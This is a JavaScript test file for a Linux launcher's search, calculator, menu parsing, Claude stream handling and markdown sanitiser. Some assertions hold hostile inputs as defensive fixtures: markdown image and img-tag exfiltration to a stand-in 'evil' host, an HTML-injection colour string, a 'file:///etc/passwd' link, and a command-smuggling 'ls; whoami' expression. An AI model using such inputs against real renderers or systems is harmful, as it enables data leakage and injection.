// node tests/search.test.js
const assert = require("assert")
const S = require("../Search.js")

assert.strictEqual(S.looksLikeQuestion("firefox"), false)
assert.strictEqual(S.looksLikeQuestion("как включить bluetooth"), true)
assert.strictEqual(S.looksLikeQuestion("bluetooth?"), true)
assert.strictEqual(S.looksLikeQuestion("one two three four"), true)
assert.strictEqual(S.looksLikeQuestion("   "), false)

const apps = [
  { id: "firefox", name: "Firefox", genericName: "Web Browser" },
  { id: "org.gnome.Nautilus", name: "Files", genericName: "File Manager" },
  { id: "hidden", name: "Firefox Helper", noDisplay: true },
  { id: "chromium", name: "Chromium", genericName: "Web Browser", keywords: ["fox"] },
  { id: "tor", name: "Tor Browser" },
]
assert.deepStrictEqual(S.searchApps(apps, "fir").map(a => a.id), ["firefox"])
assert.deepStrictEqual(S.searchApps(apps, "browser").map(a => a.id), ["tor", "chromium", "firefox"])
assert.deepStrictEqual(S.searchApps(apps, "fox").map(a => a.id), ["firefox", "chromium"])
assert.deepStrictEqual(S.searchApps(apps, "zzz"), [])

const home = "/home/u"
const out = [
  "f\t/home/u/Documents/long/path/report.pdf",
  "d\t/home/u/report",
  "f\t/home/u/.cache/report.txt",
  "f\t/home/u/proj/node_modules/report.js",
  "f\t/etc/report",
  "f\t/home/u/a/report-2024.xlsx",
  "garbage",
  "",
].join("\n")
const files = S.filterFiles(out, home, "report")
assert.deepStrictEqual(files.map(f => f.path), ["/home/u/report", "/home/u/a/report-2024.xlsx", "/home/u/Documents/long/path/report.pdf"])
assert.strictEqual(files[0].dir, true)
assert.strictEqual(S.tildify("/home/u/a", home), "~/a")

assert.deepStrictEqual(S.parseStreamLine('{"type":"system","subtype":"init","session_id":"abc"}'), { kind: "session", id: "abc" })
assert.deepStrictEqual(S.parseStreamLine('{"type":"stream_event","event":{"delta":{"type":"text_delta","text":"hi"}}}'), { kind: "text", text: "hi" })
assert.deepStrictEqual(S.parseStreamLine('{"type":"result","is_error":true,"result":"Please run /login"}'), { kind: "error", text: "Please run /login" })
assert.deepStrictEqual(S.parseStreamLine('{"type":"result","is_error":false}'), { kind: "done" })
assert.strictEqual(S.parseStreamLine("not json"), null)
assert.deepStrictEqual(S.explainError("Please run /login"), { key: "errAuth", detail: "" })
assert.deepStrictEqual(S.explainError(""), { key: "errFailed", detail: "" })
assert.deepStrictEqual(S.explainError("boom"), { key: "", detail: "boom" })

const T = require("../Strings.js")
assert.strictEqual(T.isRussian("ru_RU"), true)
assert.strictEqual(T.isRussian("en_US"), false)
assert.strictEqual(T.tr("ask", false), "Ask Claude")
assert.strictEqual(T.tr("ask", true), "Спросить Claude")
for (const [key, pair] of Object.entries(T.TEXT)) assert.ok(pair.length === 2 && pair[0] && pair[1], key)

const I = require("../Icon.js")
const cells = I.yinYangCells(16)
assert.ok(cells.length > 60 && cells.length < 200)
assert.ok(cells.every(([x, y]) => x >= 0 && x < 16 && y >= 0 && y < 16))
assert.strictEqual(S.safeMarkdown("a ![leak](https://evil/?d=x) b"), "a leak b")
assert.strictEqual(S.safeMarkdown("![x][r]\n[r]: https://evil/p.png"), "x\n")
assert.strictEqual(S.safeMarkdown('hi <img src="https://evil/x"> **b**'), 'hi &lt;img src="https://evil/x"> **b**')
assert.strictEqual(S.safeMarkdown("run `omarchy theme set <name>` or <name>"), "run `omarchy theme set <name>` or &lt;name>")
assert.strictEqual(S.safeMarkdown("```\n<b> ![x](y)\n```\nok ![x](y)"), "```\n<b> ![x](y)\n```\nok x")
assert.strictEqual(S.safeMarkdown("streaming ```\n<i>"), "streaming ```\n<i>")
assert.strictEqual(S.colorLinks("`[a](b)` [c](https://d)", "#112233"), "`[a](b)` [<font color='#112233'>c</font>](https://d)")
assert.strictEqual(S.safeMarkdown("[link](https://ok.org) `code`"), "[link](https://ok.org) `code`")
assert.strictEqual(S.safeMarkdown("see <https://wiki.hypr.land/x>"), "see [https://wiki.hypr.land/x](https://wiki.hypr.land/x)")
assert.strictEqual(S.colorLinks("[wiki](https://a.b) x", "#7aa2f7"), "[<font color='#7aa2f7'>wiki</font>](https://a.b) x")
assert.strictEqual(S.colorLinks("[wiki](https://a.b)", "red'><img src=x>"), "[wiki](https://a.b)")
assert.strictEqual(S.isWebLink("https://wiki.archlinux.org/x"), true)
assert.strictEqual(S.isWebLink("file:///etc/passwd"), false)
assert.strictEqual(S.isWebLink("foo.desktop"), false)
assert.strictEqual(S.isWebLink("steam://run/1"), false)
console.log("ok")

// MARK: integration with Omarchy data (skipped where the files are missing)
const fs = require("fs")
const OM = process.env.OMARCHY_PATH || "/usr/share/omarchy"

assert.deepStrictEqual(S.searchApps(apps, "browser", { tor: true }).map(a => a.id), ["chromium", "firefox"])
const usage = S.recordUse(S.recordUse({}, "app:firefox", 1e12), "app:firefox", 1e12)
assert.deepStrictEqual(S.searchApps(apps, "browser", {}, usage, 1e12).map(a => a.id), ["tor", "firefox", "chromium"])
assert.deepStrictEqual(S.parseHiddenIds("btop\nfoo.desktop\n\n# c\n"), { btop: true, foo: true })
assert.ok(S.frecency(usage, "app:firefox", 1e12) > S.frecency(usage, "app:firefox", 1e12 + 30 * 86400000))

const menu = S.parseMenu(
  '{\n // c\n "style": {"label":"Style"},\n "style.theme": {"icon":"x","label":"Theme","action":"omarchy-theme"},\n "style.font": {"label":"Font","when":"false"},\n "style.font.mono": {"label":"Mono","action":"f"},\n "go": {"label":"Go","target":"style"}, }',
  '{ "style.theme": {"label":"Theme picker"}, "mine": {"label":"Mine","action":"m"} }')
assert.strictEqual(menu.items["style.theme"].label, "Theme picker")
assert.strictEqual(menu.items["style.theme"].action, "omarchy-theme")
assert.deepStrictEqual(S.menuPath(menu.items, "style.font.mono"), ["Style", "Font"])
const guard = S.menuGuardScript(menu)
assert.ok(guard.includes("if { false; }") && !guard.includes("style.font"))
const hiddenMenu = S.parseGuardOutput(menu, "2:0\n")
assert.deepStrictEqual(hiddenMenu, { "style.font": true })
assert.deepStrictEqual(S.searchMenu(menu, hiddenMenu, "mono").length, 0)
const th = S.searchMenu(menu, {}, "theme")
assert.strictEqual(th[0].action, "omarchy-theme")
assert.deepStrictEqual(th[0].path, ["Style"])
assert.strictEqual(S.searchMenu(menu, {}, "style")[0].route, "style")

if (fs.existsSync(OM + "/default/omarchy/omarchy-menu.jsonc")) {
  const real = S.parseMenu(fs.readFileSync(OM + "/default/omarchy/omarchy-menu.jsonc", "utf8"), "")
  assert.ok(real.order.length > 100, "menu parsed: " + real.order.length)
  assert.ok(S.searchMenu(real, {}, "theme").length > 0)
}

const kb = S.parseKeybindings("SUPER + K                           → Keybindings\nSUPER SHIFT + F    → File manager\nbad line\n")
assert.deepStrictEqual(kb.map(b => b.keys), ["SUPER + K", "SUPER SHIFT + F"])
assert.strictEqual(S.searchBindings(kb, "file")[0].desc, "File manager")

const clients = [
  { address: "0x1", title: "Inbox — Chromium", class: "chromium", focusHistoryID: 2 },
  { address: "0x2", title: "~/Work", class: "Alacritty", focusHistoryID: 0 },
  { address: "bad", title: "chromium evil", class: "x" },
]
assert.deepStrictEqual(S.searchWindows(clients, "chrom").map(c => c.address), ["0x1"])

for (const [expr, want] of [["2*(3+4)", 14], ["2^10", 1024], ["1,5 + 2", 3.5], ["-3+1", -2], ["10/4", 2.5], ["7 % 3", 1]])
  assert.strictEqual(S.calculate(expr), want, expr)
for (const expr of ["42", "abc", "2+", "1/0", "(1", "ls; whoami", "-5"])
  assert.strictEqual(S.calculate(expr), null, expr)

const u = S.claudeUsage('{"limits":[{"label":"Session (5-hour)","percent":0.34,"resetsAt":"2026-10-13T18:40:00+00:00"},{"label":"Weekly (7-day)","percent":0.4}]}')
assert.strictEqual(u.session.percent, 34)
assert.strictEqual(u.week.percent, 40)
assert.strictEqual(S.claudeUsage("{}"), null)
console.log("ok integration")
